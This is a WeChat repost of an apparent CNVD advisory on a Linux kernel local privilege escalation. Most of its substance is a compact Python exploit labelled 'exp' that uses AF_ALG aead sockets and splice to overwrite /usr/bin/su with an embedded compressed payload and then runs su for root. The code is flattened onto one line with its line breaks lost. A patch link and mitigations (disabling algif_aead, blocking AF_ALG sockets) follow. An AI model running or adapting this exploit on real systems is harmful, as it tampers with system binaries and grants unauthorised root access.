---
title: CNVD：关于Linux内核存在本地权限提升漏洞的安全公告
url: https://mp.weixin.qq.com/s/X1HE9GQHfBKJrFin8aDf8Q
source: Doonsec's feed
date: 2026-04-30
fetch_date: 2026-05-01T05:35:45.421676
---

# CNVD：关于Linux内核存在本地权限提升漏洞的安全公告

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/IO9cWbyGNHaoicuUVFA3H2Ktxrmm6LhutRaDDf865oFch4qdQIerAJbN9W9THHlrcoTobJHxGXNTfL0Gic1hZO4GVrbot7vNwvZpUL6k9Bnko/0?wx_fmt=jpeg)

# CNVD：关于Linux内核存在本地权限提升漏洞的安全公告

观雪安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/IO9cWbyGNHYGquWHyNNcRdrMnvJtE6uOcYk0C2hSuq0xMVDBkl51TxjAiaMJXPkqaROLDPRxBibunmWv5aUfhfAQHCTHR5fc1KSQA2ka08SP0/640?wx_fmt=png&from=appmsg)

exp：

```
#!/usr/bin/env python3import os as g,zlib,socket as sdef d(x):return bytes.fromhex(x)def c(f,t,c): a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o) try:u.recv(8+t) except:0f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))while i<len(e):c(f,i,e[i:i+4]);i+=4g.system("su")
```

通过官方链接更新至最新版本：

https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5

也可采用以下临时修复措施：

1、禁用algif\_aead内核模块

2、通过seccomp或运行安全策略，阻断容器内AF\_ALG socket创建。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Kcv2biaIeNNZ96Ec1qXSmggYIeMNwUlCNjOk3QZx0icWIHHE0ACa06ibUM2hMiccwZ0UfBSL8jojeclKoA0b9zhAfg/0?wx_fmt=png)

观雪安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Kcv2biaIeNNZ96Ec1qXSmggYIeMNwUlCNjOk3QZx0icWIHHE0ACa06ibUM2hMiccwZ0UfBSL8jojeclKoA0b9zhAfg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过